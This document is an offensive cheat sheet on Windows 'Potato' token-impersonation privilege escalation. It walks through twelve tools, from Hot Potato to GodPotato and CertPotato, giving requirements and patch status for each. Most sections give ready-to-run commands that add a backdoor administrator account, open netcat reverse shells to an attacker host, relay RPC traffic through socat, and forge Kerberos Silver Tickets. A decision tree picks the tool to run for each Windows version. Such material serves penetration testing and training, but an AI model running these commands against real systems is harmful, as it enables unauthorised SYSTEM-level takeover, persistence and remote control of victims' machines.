---
icon: potato
---

# Potato Attacks

### What are Potato Attacks?

Potato attacks abuse **Windows token impersonation** to escalate from a low-privileged service account to **SYSTEM**. They all rely on one core idea — trick a SYSTEM-level process into authenticating to you, then steal/impersonate that token.

**Core Requirement (most potatoes):**

* `SeImpersonatePrivilege` OR `SeAssignPrimaryTokenPrivilege`
* These are available by default to: IIS App Pool, SQL Server service, Windows services

**Check your privileges:**

```cmd
whoami /priv
```

***

### 1. Hot Potato (2016)

**How it works:** Spoofs NBNS responses for WPAD hostname → captures NTLM auth from Windows Update/IE → relays HTTP→SMB on same machine → gets SYSTEM.

**Requirements:**

* Low-priv user on Windows 7 / Server 2008 / 2012
* No special privileges needed

**Works on:** Windows 7, 8, Server 2008, 2012 (unpatched) **Still works:** ❌ Patched (MS16-075)

```cmd
# Windows 7
Potato.exe -ip <ip> -cmd "net user hacker Pass@123 /add" -disable_exhaust true

# Windows Server 2008
Potato.exe -ip <ip> -cmd "net user hacker Pass@123 /add" -disable_exhaust true -disable_defender true -spoof_host WPAD.DOMAIN.LOCAL
```

**Scenario:** You land on an old unpatched Windows 7 machine as a low-priv user — no service account needed.

***

### 2. RottenPotato (2016)

**How it works:** Uses DCOM/RPC to trigger NTLM auth from SYSTEM → intercepts it via a local proxy → calls `AcceptSecurityContext()` → impersonates SYSTEM token. More reliable than Hot Potato.

**Requirements:**

* `SeImpersonatePrivilege`
* Meterpreter session with Incognito module

**Works on:** Pre-Windows 10 1809 / pre-Server 2019 **Still works:** ❌ Patched (DCOM + OXID resolver patch)

```bash
# Inside Meterpreter session
use incognito
execute -cH -f ./rottenpotato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

**Scenario:** You have a Meterpreter shell as IIS/SQL service account with SeImpersonatePrivilege on older Windows.

***

### 3. LonelyPotato (2017)

**How it works:** Same as RottenPotato but no Meterpreter/Incognito needed. Directly calls `CreateProcessAsUser()` to spawn process as SYSTEM.

**Requirements:**

* `SeAssignPrimaryTokenPrivilege`
* Session 0 (service account context)

**Still works:** ❌ Same patch as RottenPotato

```cmd
.\LonelyPotato.exe
```

**Scenario:** You have a shell as a Windows service account in Session 0 (IIS, scheduled task, etc).

***

### 4. JuicyPotato (2018)

**How it works:** Improved RottenPotato — lets you choose which COM CLSID to abuse instead of hardcoded BITS CLSID. More flexible, no Meterpreter needed.

**Requirements:**

* `SeImpersonatePrivilege` OR `SeAssignPrimaryTokenPrivilege`
* Need to find a working CLSID for the target OS

**Works on:** Pre-Windows 10 1809 / pre-Server 2019 **Still works:** ❌ Patched (custom OXID port no longer allowed)

```cmd
# Basic — try both token methods, COM listener on port 1337
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

# With specific CLSID
.\JuicyPotato.exe -l 1337 -p C:\shell.exe -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -t *
```

**Scenario:** Service account shell on Windows Server 2016 or older — most reliable potato for those systems.

***

### 5. SweetPotato (2020)

**How it works:** C# version of JuicyPotato. Adds a new path — when BITS COM object starts, it connects to local WinRM (port 5985) as SYSTEM. Intercept that → steal token. Also embeds PrintSpoofer.

**Requirements:**

* `SeImpersonatePrivilege`
* Works even when JuicyPotato is patched

**Still works:** Yes (WinRM + PrintSpoofer paths not patched)

```cmd
# Via WinRM path — execute netcat reverse shell
.\SweetPotato.exe -p nc.exe -a "attacker-ip 4444 -e cmd" -e WinRM

# Via PrintSpoofer path
.\SweetPotato.exe -p cmd.exe -e EfsRpc
```

**Scenario:** You're on Windows 10/Server 2019 where JuicyPotato fails. SweetPotato tries alternative paths automatically.

***

### 6. PrintSpoofer (2020)

**How it works:** Creates a controlled Named Pipe → uses Print Spooler's `RpcRemoteFindFirstPrinterChangeNotificationEx()` to force SYSTEM to connect to your pipe → impersonates the SYSTEM token. Abuses a `/` in hostname to bypass path validation.

**Requirements:**

* `SeImpersonatePrivilege`
* Print Spooler service must be running

**Still works:** Yes (no official patch)

```cmd
# Interactive SYSTEM shell
.\PrintSpoofer.exe -i -c cmd.exe

# Reverse shell
.\PrintSpoofer.exe -c "nc.exe attacker-ip 4444 -e cmd"
```

**Scenario:** Shell as IIS AppPool / SQL Server / Network Service on Windows 10 or Server 2019 — Print Spooler is running by default.

***

### 7. RoguePotato (2020)

**How it works:** Bypasses JuicyPotato patch by using a remote OXID resolver (via socat redirect on attacker machine) → coerces NETWORK SERVICE authentication via Named Pipe (same `/` trick as PrintSpoofer) → steals SYSTEM token from RPCSS process handles.

**Requirements:**

* `SeImpersonatePrivilege`
* socat running on attacker machine (port redirect)
* Network access from victim to attacker

**Still works:**  Yes

```bash
# Step 1 — On attacker machine
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# Step 2 — On victim machine (as service account)
.\RoguePotato.exe -r ATTACKER_IP -e "cmd /c net user hacker Pass@123 /add" -l 9999
```

**Scenario:** JuicyPotato doesn't work (Windows 10 1809+), PrintSpoofer fails because Spooler is stopped — use RoguePotato with attacker machine as relay.

***

### 8. GenericPotato (2021)

**How it works:** Not an auto-privesc — sets up HTTP or Named Pipe listener and waits for a privileged user to connect (via SSRF, file write, or other trigger) → captures NTLM auth → impersonates.

**Requirements:**

* `SeImpersonatePrivilege`
* A way to trigger a privileged authentication (SSRF, coercion, etc.)

**Still works:** Yes

```cmd
# Listen on HTTP port 8000
.\GenericPotato.exe -e HTTP -l 8000

# Listen on Named Pipe
.\GenericPotato.exe -e NamedPipe -l 9999
```

**Scenario:** CTF/restricted environment — JuicyPotato patched, WinRM running, Print Spooler stopped, RPC filtered. You have SSRF → trigger auth to GenericPotato listener.

***

### 9. JuicyPotatoNG (2022)

**How it works:** Revived JuicyPotato using Kerberos DCOM authentication trick. Calls `LogonUser()` with Logon Type 9 (NewCredentials) → LSASS adds INTERACTIVE SID to token → bypasses CLSID restrictions. Uses SSPI hook on `AcceptSecurityContext()` instead of `RpcImpersonateClient()`.

**Requirements:**

* `SeImpersonatePrivilege` OR `SeAssignPrimaryTokenPrivilege`
* Works on modern Windows (10, 11, Server 2019/2022)

**Still works:** Yes

```cmd
# Default — try both CreateProcessWithTokenW and CreateProcessAsUser
.\JuicyPotatoNG.exe -p C:\Windows\System32\cmd.exe -t *

# Custom listener port
.\JuicyPotatoNG.exe -p C:\Windows\System32\powershell.exe -t * -l 1337
```

**Scenario:** Modern Windows Server 2022 or Windows 11 — shell as IIS/SQL service account. Best modern replacement for JuicyPotato.

***

### 10. GodPotato (2023)

**How it works:** Similar to JuicyPotatoNG — abuses DCOM/RPC to coerce SYSTEM authentication. Works across a wide range of Windows versions from Server 2012 to Server 2022.

**Requirements:**

* `SeImpersonatePrivilege`
* Works on Windows 2012 - 2022, Windows 8 - 11

**Still works:** Yes — best all-rounder currently

```cmd
# Execute command as SYSTEM
.\GodPotato.exe -cmd "cmd /c whoami"

# Add user
.\GodPotato.exe -cmd "cmd /c net user hacker Pass@123 /add && net localgroup administrators hacker /add"

# Reverse shell
.\GodPotato.exe -cmd "cmd /c nc.exe attacker-ip 4444 -e cmd"
```

**Scenario:** Any modern Windows with service account shell — go-to tool first because of wide OS version support.

***

### 11. CoercedPotato (2023)

**How it works:** Inspired by PrintSpoofer but uses multiple RPC calls (not just Print Spooler) — including MS-EFSR (PetitPotam calls), MS-RPRN. Creates Named Pipe → uses RPC calls to coerce SYSTEM auth → impersonates. Useful when Print Spooler is stopped.

**Requirements:**

* `SeImpersonatePrivilege`
* Works on Windows 10, 11, Server 2022 fully patched

**Still works:** Yes — tested on fully updated systems

```cmd
# Basic SYSTEM shell
.\CoercedPotato.exe -c whoami

# Reverse shell
.\CoercedPotato.exe -c "nc.exe attacker-ip 4444 -e cmd"
```

**Scenario:** Print Spooler is disabled (common hardening), JuicyPotatoNG fails — CoercedPotato uses EFS/PetitPotam RPC calls instead.

***

### 12. CertPotato (2022)

**How it works:** Service accounts use the machine account for network auth. Use Rubeus `tgtdeleg` trick to get machine TGT as service account → request ADCS cert for machine account → PKINIT auth → get machine NTLM hash → forge Silver Ticket as admin.

**Requirements:**

* Code execution as service account (IIS, Network Service, etc.)
* Domain-joined machine
* ADCS running in the domain
* Machine certificate template available (default `Machine` template)

**Still works:**  Yes

```bash
# Step 1 — As service account, get machine TGT
.\Rubeus.exe tgtdeleg /nowrap

# Step 2 — On Linux, convert ticket
echo "<base64_ticket>" | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# Step 3 — Request machine certificate
certipy req -k -target ca-host -ca CA-NAME -template Machine

# Step 4 — Get machine NTLM hash via PKINIT
certipy auth -pfx machine.pfx -no-save

# Step 5 — Forge Silver Ticket
impacket-ticketer -domain corp.local -domain-sid <SID> -spn "cifs/machine" -nthash <machine_hash> administrator
```

**Scenario:** You have IIS shell on a domain-joined server. No SeImpersonatePrivilege available but ADCS is in the domain. Escalate to admin via certificate path.

***

### Attack Flow  Which Potato to Use?

```
Do you have SeImpersonatePrivilege?
│
├── NO → CertPotato (if ADCS available) or find SeImpersonate first
│
└── YES → What Windows version?
          │
          ├── Pre-2019 → JuicyPotato (pick right CLSID)
          │
          └── 2019/2022/Win10/11 →
                    │
                    ├── Try GodPotato first (widest support)
                    ├── PrintSpoofer (if Spooler is running)
                    ├── JuicyPotatoNG (modern alternative)
                    ├── CoercedPotato (if Spooler stopped)
                    └── RoguePotato (if above all fail, need socat)
```

***

### Check Before Running

```cmd
# Check privileges
whoami /priv

# Check if Print Spooler is running
sc query spooler

# Check Windows version
systeminfo | findstr /i "OS Name"

# Check if already SYSTEM or admin
whoami
```
